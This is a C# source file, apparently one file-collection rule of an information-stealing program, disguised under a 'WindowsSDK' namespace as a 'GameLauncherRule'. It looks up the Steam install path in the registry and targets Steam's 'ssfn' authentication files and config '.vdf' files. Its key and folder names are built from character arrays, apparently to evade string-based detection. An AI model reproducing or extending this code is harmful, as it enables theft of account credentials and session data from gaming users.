using Microsoft.Win32;
using System.Collections.Generic;
using System.IO;
using WindowsSDK.Objects.Files;

namespace WindowsSDK.Data.Files.Rules
{
    public class GameLauncherRule : FileScannerRule
    {
        public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
        {
            try
            {
                if (scannerArg.Directory.Contains("config"))
                {
                    return "config";
                }
            }
            catch
            {
            }
            return string.Empty;
        }

        public override IEnumerable<FileScannerArg> GetScanArgs()
        {
            List<FileScannerArg> list = new List<FileScannerArg>();
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(new string(new char[20]
                {
                    'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'V',
                    'a', 'l', 'v', 'e', '\\', 'S', 't', 'e', 'a', 'm'
                }));
                if (registryKey == null)
                {
                    return list;
                }
                string text = registryKey.GetValue(new string(new char[9] { 'S', 't', 'e', 'a', 'm', 'P', 'a', 't', 'h' })) as string;
                if (!Directory.Exists(text))
                {
                    return list;
                }
                list.Add(new FileScannerArg
                {
                    Directory = text,
                    Pattern = "*ssfn*",
                    Recoursive = false
                });
                list.Add(new FileScannerArg
                {
                    Directory = Path.Combine(text, new string(new char[6] { 'c', 'o', 'n', 'f', 'i', 'g' })),
                    Pattern = "*.vdf",
                    Recoursive = false
                });
            }
            catch
            {
            }
            return list;
        }
    }
}
